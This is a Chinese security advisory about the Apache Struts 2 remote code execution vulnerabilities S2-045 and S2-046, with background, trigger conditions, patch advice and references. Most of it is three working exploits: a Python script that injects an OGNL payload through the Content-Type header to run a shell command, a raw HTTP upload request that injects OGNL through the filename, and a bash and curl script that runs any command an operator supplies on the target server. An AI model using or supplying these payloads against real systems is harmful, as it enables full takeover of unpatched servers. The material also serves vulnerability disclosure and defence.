> 原文链接: https://www.anquanke.com//post/id/85744 


# 【重大漏洞预警】Struts 2 远程代码执行漏洞(s2-045s2-046) (含PoC)


                                阅读量   
                                **499950**
                            
                        |
                        
                                                                                    



**[![](https://p3.ssl.qhimg.com/t01bc3ed8c359dc1cab.png)](https://p3.ssl.qhimg.com/t01bc3ed8c359dc1cab.png)**



**<br>**

**背景介绍**



近日，安全研究人员发现著名J2EE框架——Struts2存在远程代码执行的漏洞，Struts2官方已经确认该漏洞（S2-045,S2-046），并定级为高危漏洞。

Struts2 的使用范围及其广泛，国内外均有大量厂商使用该框架。

Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。Struts 2是Struts的下一代产品，是在 struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。（来源：百度百科）

**漏洞描述**

使用Jakarta插件处理文件上传操作时可能导致远程代码执行漏洞。

[![](https://p2.ssl.qhimg.com/t011982617da999ca38.png)](https://p2.ssl.qhimg.com/t011982617da999ca38.png)

**S2-045漏洞影响**

攻击者可以通过构造HTTP请求头中的Content-Type值可能造成远程代码执行。

<br>



**<strong style="font-size: 18px;text-indent: 32px">S2-045**PoC_1（来源于网络：[http://www.cnblogs.com/milantgh/p/6512739.html](http://www.cnblogs.com/milantgh/p/6512739.html)  ）</strong>

****



```
#! /usr/bin/env python
# encoding:utf-8
import urllib2
import sys
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers
def poc():
    register_openers()
    datagen, header = multipart_encode(`{`"image1": open("tmp.txt", "rb")`}`)
    header["User-Agent"]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    header["Content-Type"]="%`{`(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ifconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?`{`'cmd.exe','/c',#cmd`}`:`{`'/bin/bash','-c',#cmd`}`)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())`}`"
    request = urllib2.Request(str(sys.argv[1]),datagen,headers=header)
    response = urllib2.urlopen(request)
    print response.read()
poc()
```







**S2-046漏洞影响（更新）**



**触发条件**

上传文件的大小（由Content-Length头指定）大于Struts2默认允许的最大大小（2M）。

header中的Content-Disposition中包含空字节。

文件名内容构造恶意的OGNL内容。

<br>

**<strong>S2-046**PoC（来源于网络：[](http://www.cnblogs.com/milantgh/p/6512739.html)[https://community.hpe.com/t5/Security-Research/Struts2-046-A-new-vector/ba-p/6949723#](https://community.hpe.com/t5/Security-Research/Struts2-046-A-new-vector/ba-p/6949723#) ）</strong>

需要在strust.xml中加入 &lt;constant name="struts.multipart.parser" value="jakarta-stream" /&gt;才能触发。

```
POST /doUpload.action HTTP/1.1
Host: localhost:8080
Content-Length: 10000000
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAnmUgTEhFhOZpr9z
Connection: close

------WebKitFormBoundaryAnmUgTEhFhOZpr9z
Content-Disposition: form-data; name="upload"; filename="%`{`#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','Kaboom')`}`"
Content-Type: text/plain
Kaboom 

------WebKitFormBoundaryAnmUgTEhFhOZpr9z--
```

**<strong><br>**</strong>

**<strong>S2-046**PoC_2（来源于网络：[https://gist.githubusercontent.com/frohoff/a3e24764561c0c18b6270805140e7600 ](https://gist.githubusercontent.com/frohoff/a3e24764561c0c18b6270805140e7600)）</strong>

```
#!/bin/bash

url=$1
cmd=$2
shift
shift

boundary="---------------------------735323031399963166993862150"
content_type="multipart/form-data; boundary=$boundary"
payload=$(echo "%`{`(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"$cmd"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?`{`'cmd.exe','/c',#cmd`}`:`{`'/bin/bash','-c',#cmd`}`)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())`}`")

printf -- "--$boundaryrnContent-Disposition: form-data; name="foo"; filename="%sb"rnContent-Type: text/plainrnrnxrn--$boundary--rnrn" "$payload" | curl "$url" -H "Content-Type: $content_type" -H "Expect: " -H "Connection: close" --data-binary @- $@
```

**验证截图**

[![](https://p4.ssl.qhimg.com/t01203e6ee0e6688c16.png)](https://p4.ssl.qhimg.com/t01203e6ee0e6688c16.png)

**修复建议**

1. 严格过滤 **Content-Type** 、**filename**里的内容，严禁ognl表达式相关字段。

2. 如果您使用基于Jakarta插件，请升级到Apache Struts 2.3.32或2.5.10.1版本。（**强烈推荐**）

<br>

**官网公告**

[https://cwiki.apache.org/confluence/display/WW/S2-045](https://cwiki.apache.org/confluence/display/WW/S2-045)

[https://cwiki.apache.org/confluence/display/WW/S2-04](https://cwiki.apache.org/confluence/display/WW/S2-045)6

****

**补丁地址**

Struts 2.3.32：[https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.3.32](https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.3.32) 

Struts 2.5.10.1：[https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.5.10.1](https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.5.10.1) 

<br>



**参考**

[http://struts.apache.org/docs/s2-045.html](http://struts.apache.org/docs/s2-045.html) 

[http://struts.apache.org/docs/s2-046.html](http://struts.apache.org/docs/s2-046.html)

[https://gist.githubusercontent.com/frohoff/a3e24764561c0c18b6270805140e7600](https://community.hpe.com/t5/Security-Research/Struts2-046-A-new-vector/ba-p/6949723#)

[https://community.hpe.com/t5/Security-Research/Struts2-046-A-new-vector/ba-p/6949723#](https://community.hpe.com/t5/Security-Research/Struts2-046-A-new-vector/ba-p/6949723#)
